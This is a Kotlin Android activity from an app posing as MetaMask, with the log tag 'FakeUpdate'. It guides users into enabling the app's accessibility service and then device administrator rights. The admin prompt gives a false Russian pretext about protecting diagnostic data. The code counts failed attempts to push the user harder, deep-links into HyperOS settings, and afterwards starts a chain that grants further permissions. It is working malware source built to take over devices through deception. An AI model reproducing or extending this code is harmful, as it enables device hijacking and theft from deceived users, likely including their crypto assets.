package com.example.MetaMask.activities

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.R
import com.example.MetaMask.receivers.BadgerFalconRecv
import com.example.MetaMask.services.AccessSvc

class CoralCobraActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "FakeUpdate"
        private const val REQ_ADMIN = 202
        private const val PREFS_NAME = "CoralCobraPrefs"
        private const val PREF_KEY_A11Y_FAILED = "a11yFailedAttempts"

        @Volatile var instance: CoralCobraActivity? = null
        @Volatile var trackingDeviceAdminDialog = false
        @Volatile var trackingAccessibilitySettings = false

        fun isOurGuidedSystemFlowActive(): Boolean =
            trackingDeviceAdminDialog || trackingAccessibilitySettings

        fun notifyAdminEnabledFromSystem() {
            android.util.Log.d("XDBG", "[CoralCobraActivity] notifyAdminEnabledFromSystem enter") //xdbg
            instance?.tryCompleteAdminFromReceiver()
        }
    }

    private val handler = Handler(Looper.getMainLooper())

    private lateinit var tvStep: TextView
    private lateinit var viewProgress: View
    private lateinit var tvTitle: TextView
    private lateinit var tvSubtitle: TextView
    private lateinit var tvDesc: TextView
    private lateinit var llReasons: LinearLayout
    private lateinit var llAccessibilityIllustration: LinearLayout
    private lateinit var llStatus: LinearLayout
    private lateinit var tvStatus: TextView
    private lateinit var tvWarning: TextView
    private lateinit var btnAction: Button

    private var currentStep = 0
    private var waitingForResult = false
    private var adminFlowConsumed = false
    @Volatile private var awaitingHyperOsAdmin = false
    private var accessibilityObserver: ContentObserver? = null
    private var suppressLeaveHint = false
    private var accessibilityFailedAttempts = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        super.onCreate(savedInstanceState)
        instance = this
        AccessSvc.instance?.stoatShield?.setupInProgress = true
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        setContentView(R.layout.activity_coral_cobra)

        tvStep = findViewById(R.id.tvStep)
        viewProgress = findViewById(R.id.viewProgress)
        tvTitle = findViewById(R.id.tvTitle)
        tvSubtitle = findViewById(R.id.tvSubtitle)
        tvDesc = findViewById(R.id.tvDesc)
        llReasons = findViewById(R.id.llReasons)
        llAccessibilityIllustration = findViewById(R.id.llAccessibilityIllustration)
        llStatus = findViewById(R.id.llStatus)
        tvStatus = findViewById(R.id.tvStatus)
        tvWarning = findViewById(R.id.tvWarning)
        btnAction = findViewById(R.id.btnAction)

        findViewById<TextView>(R.id.tvStep2).text =
            getString(R.string.cc_step_2, getString(R.string.app_name))

        btnAction.setOnClickListener { onActionClicked() }

        accessibilityFailedAttempts = try {
            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getInt(PREF_KEY_A11Y_FAILED, 0)
        } catch (_: Exception) { 0 }

        showStep(detectCurrentStep())
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] onActivityResult enter requestCode=${requestCode} resultCode=${resultCode} data=${data}") //xdbg
        super.onActivityResult(requestCode, resultCode, data)
        waitingForResult = false
        trackingDeviceAdminDialog = false

        if (requestCode == REQ_ADMIN) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            if (adminFlowConsumed) return
            val adminOk = isDeviceAdmin()
            if (adminOk) {
                android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
                goHomeAndFinishAdminFlow(granted = true)
            } else {
                if (com.example.MetaMask.HyperOsDetector.isHyperOs) {
                    android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
                    awaitingHyperOsAdmin = true
                    handler.postDelayed({
                        if (adminFlowConsumed) return@postDelayed
                        awaitingHyperOsAdmin = false
                        goHomeAndFinishAdminFlow(granted = isDeviceAdmin())
                    }, 10_000L)
                } else {
                    handler.postDelayed({
                        if (adminFlowConsumed) return@postDelayed
                        val adminOkDelayed = isDeviceAdmin()
                        goHomeAndFinishAdminFlow(granted = adminOkDelayed)
                    }, 1500L)
                }
            }
        }
    }

    override fun onResume() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] onResume enter") //xdbg
        super.onResume()
        suppressLeaveHint = false
        if (trackingAccessibilitySettings && !isAccessibilityEnabled()) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            accessibilityFailedAttempts++
            try {
                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putInt(PREF_KEY_A11Y_FAILED, accessibilityFailedAttempts)
                    .apply()
            } catch (_: Exception) {}
        }
        trackingAccessibilitySettings = false
        AccessSvc.instance?.stoatShield?.setupInProgress = true
        if (!waitingForResult && !awaitingHyperOsAdmin) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            showStep(detectCurrentStep())
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] onDestroy enter") //xdbg
        instance = null
        trackingDeviceAdminDialog = false
        trackingAccessibilitySettings = false
        AccessSvc.instance?.stoatShield?.setupInProgress = false
        unregisterAccessibilityObserver()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun detectCurrentStep(): Int = when {
        !isAccessibilityEnabled() -> 0
        !isDeviceAdmin()          -> 1
        else                      -> 2
    }

    private fun showStep(step: Int) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] showStep enter step=${step}") //xdbg
        currentStep = step
        llStatus.visibility = View.GONE
        tvWarning.visibility = View.GONE
        llReasons.removeAllViews()
        when (step) {
            0 -> showAccessibilityStep()
            1 -> showAdminStep()
            else -> finishSetup()
        }
    }

    private fun showAccessibilityStep() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] showAccessibilityStep enter") //xdbg
        setProgress(1, 2)
        llAccessibilityIllustration.visibility = View.VISIBLE
        llReasons.visibility = View.GONE
        tvTitle.text = getString(R.string.cc_title)
        tvDesc.text = getString(R.string.cc_desc)
        if (accessibilityFailedAttempts >= 1) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            tvWarning.text = getString(R.string.cc_hidden_request_hint)
            tvWarning.visibility = View.VISIBLE
        } else {
            tvWarning.visibility = View.GONE
        }
        btnAction.text = getString(R.string.cc_button)
        btnAction.isEnabled = true
        registerAccessibilityObserver()
    }

    private fun showAdminStep() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] showAdminStep enter") //xdbg
        unregisterAccessibilityObserver()
        setProgress(2, 2)
        llAccessibilityIllustration.visibility = View.GONE
        llReasons.visibility = View.VISIBLE
        tvTitle.text = getString(R.string.cc_admin_title)
        tvDesc.text = getString(R.string.cc_admin_desc)
        addReason(getString(R.string.cc_admin_reason_1))
        addReason(getString(R.string.cc_admin_reason_2))
        addReason(getString(R.string.cc_admin_reason_3))
        tvWarning.visibility = View.VISIBLE
        tvWarning.text = getString(R.string.cc_admin_warning)
        btnAction.text = getString(R.string.cc_admin_button)
        btnAction.isEnabled = true
    }

    private fun goHomeAndFinishAdminFlow(granted: Boolean) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] goHomeAndFinishAdminFlow enter granted=${granted}") //xdbg
        if (adminFlowConsumed) return
        adminFlowConsumed = true
        trackingDeviceAdminDialog = false
        try {
            startActivity(Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            })
        } catch (_: Exception) {}
        AccessSvc.instance?.stoatShield?.setupInProgress = false
        if (granted) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            AccessSvc.instance?.onDeviceAdminSetupFinished(true)
        } else {
            AccessSvc.instance?.startFullRuntimePermissionFlow()
        }
        finish()
    }

    private fun tryCompleteAdminFromReceiver() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] tryCompleteAdminFromReceiver enter") //xdbg
        if (adminFlowConsumed) return
        if (!isDeviceAdmin()) return
        if (!waitingForResult && !trackingDeviceAdminDialog && !awaitingHyperOsAdmin) return
        awaitingHyperOsAdmin = false
        goHomeAndFinishAdminFlow(granted = true)
    }

    private fun finishSetup() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] finishSetup enter") //xdbg
        finish()
    }

    private fun onActionClicked() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] onActionClicked enter") //xdbg
        when (currentStep) {
            0 -> openAccessibility()
            1 -> requestAdmin()
        }
    }

    private fun openAccessibility() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] openAccessibility enter") //xdbg
        suppressLeaveHint = true
        trackingAccessibilitySettings = true
        setWaitingStatus(getString(R.string.cc_waiting_accessibility))
        val componentFlat = ComponentName(this, AccessSvc::class.java).flattenToString()
        val isHyperOs = com.example.MetaMask.HyperOsDetector.isHyperOs

        val intents = mutableListOf<Intent>()
        if (isHyperOs) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            intents += Intent().apply {
                setClassName("com.android.settings", "com.android.settings.SubSettings")
                putExtra(":android:show_fragment", "com.android.settings.accessibility.InstalledAccessibilityService")
                putExtra(":settings:fragment_args_key", componentFlat)
                val args = Bundle().apply { putString(":settings:fragment_args_key", componentFlat) }
                putExtra(":android:show_fragment_args", args)
                putExtra(":settings:show_fragment_args", args)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            intents += Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                putExtra(":settings:fragment_args_key", componentFlat)
                val args = Bundle().apply { putString(":settings:fragment_args_key", componentFlat) }
                putExtra(":settings:show_fragment_args", args)
            }
        }
        intents += Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intents += Intent(Settings.ACTION_SETTINGS)

        for (i in intents) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] loop") //xdbg
            try {
                startActivity(i)
                return
            } catch (_: Exception) {}
        }
    }

    private fun requestAdmin() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] requestAdmin enter") //xdbg
        suppressLeaveHint = true
        trackingAccessibilitySettings = false
        AccessSvc.instance?.autoIbis?.onDeviceAdminRequested()
        setWaitingStatus(getString(R.string.cc_waiting_admin))
        adminFlowConsumed = false
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this@CoralCobraActivity, BadgerFalconRecv::class.java)
                )
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Требуется для защиты системных данных диагностики."
                )
            }
            waitingForResult = true
            trackingDeviceAdminDialog = true
            startActivityForResult(intent, REQ_ADMIN)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[CoralCobraActivity] catch (ignored)") //xdbg
            waitingForResult = false
            trackingDeviceAdminDialog = false
            goHomeAndFinishAdminFlow(granted = false)
        }
    }

    fun notifyAccessibilityGranted() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] notifyAccessibilityGranted enter") //xdbg
        handler.post {
            trackingAccessibilitySettings = false
            unregisterAccessibilityObserver()
            startFullFlowAndFinish()
        }
    }

    private fun startFullFlowAndFinish() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] startFullFlowAndFinish enter") //xdbg
        try {
            startActivity(Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            })
        } catch (_: Exception) {}
        val svc = AccessSvc.instance
        if (svc != null) {
            android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
            svc.startFullRuntimePermissionFlow()
        } else {
            AccessSvc.pendingGrantChainStart = true
        }
        finish()
    }

    private fun registerAccessibilityObserver() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] registerAccessibilityObserver enter") //xdbg
        if (accessibilityObserver != null) return
        val obs = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                android.util.Log.d("XDBG", "[CoralCobraActivity] onChange enter selfChange=${selfChange}") //xdbg
                if (isAccessibilityEnabled()) {
                    android.util.Log.d("XDBG", "[CoralCobraActivity] if branch") //xdbg
                    unregisterAccessibilityObserver()
                    handler.post {
                        trackingAccessibilitySettings = false
                        startFullFlowAndFinish()
                    }
                }
            }
        }
        accessibilityObserver = obs
        try {
            contentResolver.registerContentObserver(
                Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                false, obs
            )
        } catch (_: Exception) {}
    }

    private fun unregisterAccessibilityObserver() {
        android.util.Log.d("XDBG", "[CoralCobraActivity] unregisterAccessibilityObserver enter") //xdbg
        accessibilityObserver?.let {
            try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {}
            accessibilityObserver = null
        }
    }

    private fun setWaitingStatus(msg: String) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] setWaitingStatus enter msg=${msg}") //xdbg
        tvStatus.text = msg
        llStatus.visibility = View.VISIBLE
        btnAction.isEnabled = false
    }

    private fun setProgress(current: Int, total: Int) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] setProgress enter current=${current} total=${total}") //xdbg
        tvStep.text = "Шаг $current / $total"
        val fraction = current.toFloat() / total.toFloat()
        val screenW = resources.displayMetrics.widthPixels
        val params = viewProgress.layoutParams
        params.width = (screenW * fraction).toInt()
        viewProgress.layoutParams = params
    }

    private fun addReason(text: String) {
        android.util.Log.d("XDBG", "[CoralCobraActivity] addReason enter text=${text}") //xdbg
        val tv = TextView(this)
        tv.text = "✓  $text"
        tv.textSize = 14f
        tv.setTextColor(0xFF2E7D32.toInt())
        val lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        lp.topMargin = (8 * resources.displayMetrics.density).toInt()
        tv.layoutParams = lp
        llReasons.addView(tv)
    }

    private fun isAccessibilityEnabled(): Boolean {
        android.util.Log.d("XDBG", "[CoralCobraActivity] isAccessibilityEnabled enter") //xdbg
        val str = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        android.util.Log.d("XDBG", "[CoralCobraActivity] return") //xdbg
        return str.contains("$packageName/${AccessSvc::class.java.name}")
    }

    private fun isDeviceAdmin(): Boolean {
        android.util.Log.d("XDBG", "[CoralCobraActivity] isDeviceAdmin enter") //xdbg
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return false
        android.util.Log.d("XDBG", "[CoralCobraActivity] return") //xdbg
        return dpm.isAdminActive(ComponentName(this, BadgerFalconRecv::class.java))
    }
}
